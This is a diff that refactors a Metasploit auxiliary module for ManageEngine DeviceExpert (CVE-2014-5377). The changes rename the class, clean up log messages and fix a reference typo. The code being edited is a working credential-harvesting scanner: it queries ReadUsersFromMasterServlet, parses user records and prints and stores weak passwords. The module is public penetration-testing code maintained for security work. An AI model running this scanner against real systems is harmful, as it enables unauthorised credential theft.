@@ -1,11 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
   include Msf::Exploit::Remote::HttpClient
@@ -25,12 +23,12 @@ class Metasploit3 < Msf::Auxiliary
       'Author'         =>
         [
           'Pedro Ribeiro <pedrib[at]gmail.com>', # Discovery and exploit
-          'Brendan Coles <bcoles[at]gmail.com>'  # msf
+          'bcoles'  # metasploit module
         ],
       'References'     =>
         [
           ['EDB', '34449'],
-          ['OSVBD', '110522'],
+          ['OSVDB', '110522'],
           ['CVE', '2014-5377']
         ],
       'DisclosureDate' => 'Aug 28 2014'))
@@ -38,8 +36,7 @@ class Metasploit3 < Msf::Auxiliary
       [
         Opt::RPORT(6060),
         OptBool.new('SSL', [true, 'Use SSL', true])
-      ], self.class)
-    deregister_options('RHOST')
+      ])
   end
 
   def check
@@ -48,17 +45,17 @@ class Metasploit3 < Msf::Auxiliary
 
   def get_users
     users = nil
-    vprint_status("#{peer} - Reading users from master...")
+    vprint_status("Reading users from master...")
     res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'ReadUsersFromMasterServlet'))
     if !res
-      vprint_error("#{peer} - Connection failed")
+      vprint_error("Connection failed")
     elsif res.code == 404
-      vprint_error("#{peer} - Could not find 'ReadUsersFromMasterServlet'")
+      vprint_error("Could not find 'ReadUsersFromMasterServlet'")
     elsif res.code == 200 && res.body =~ /<discoverydata>(.+)<\/discoverydata>/
       users = res.body.scan(/<discoverydata>(.*?)<\/discoverydata>/)
-      vprint_good("#{peer} - Found #{users.length} users")
+      vprint_good("Found #{users.length} users")
     else
-      vprint_error("#{peer} - Could not find any users")
+      vprint_error("Could not find any users")
     end
     users
   end
@@ -93,7 +90,7 @@ class Metasploit3 < Msf::Auxiliary
       workspace_id: myworkspace_id
     }
 
-    cred_table = Rex::Ui::Text::Table.new(
+    cred_table = Rex::Text::Table.new(
       'Header'  => 'ManageEngine DeviceExpert User Credentials',
       'Indent'  => 1,
       'Columns' =>
@@ -107,7 +104,7 @@ class Metasploit3 < Msf::Auxiliary
         ]
     )
 
-    vprint_status("#{peer} - Parsing user data...")
+    vprint_status("Parsing user data...")
     users.each do |user|
       record = parse_user_data(user.to_s)
       next if record.join.empty?
@@ -122,7 +119,7 @@ class Metasploit3 < Msf::Auxiliary
       cred_table << [user, pass, hash, role, mail, salt]
 
       if pass
-        print_status("#{peer} - Found weak credentials (#{user}:#{pass})")
+        print_good("Found weak credentials (#{user}:#{pass})")
         credential_data = {
           origin_type: :service,
           module_fullname: self.fullname,
